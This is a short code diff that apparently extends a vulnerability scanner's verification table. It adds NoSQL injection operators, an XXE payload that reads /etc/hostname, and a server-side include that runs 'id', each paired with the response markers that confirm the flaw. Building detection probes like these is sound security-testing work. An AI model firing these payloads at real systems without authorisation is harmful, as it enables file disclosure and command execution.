@@ -72,6 +72,28 @@ VERIFY_PAYLOADS: dict[str, dict[str, tuple[str, list[bytes]]]] = {
         "exploit": ("{{7*9}}", [b"63"]),
         "bypass": ("${7*8}", [b"56"]),
     },
+    "nosqliinject": {
+        "error": (
+            '{"$gt": ""}',
+            [b"error", b"CastError", b"MongoError", b"SyntaxError"],
+        ),
+        "blind": (
+            '{"$ne": null}',
+            [b"true", b"1", b"found"],
+        ),
+    },
+    "xxedetect": {
+        "file_read": (
+            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><foo>&xxe;</foo>',
+            [b"\n"],
+        ),
+    },
+    "ssiinject": {
+        "detect": (
+            '<!--#exec cmd="id"-->',
+            [b"uid=", b"gid="],
+        ),
+    },
 }
 
 
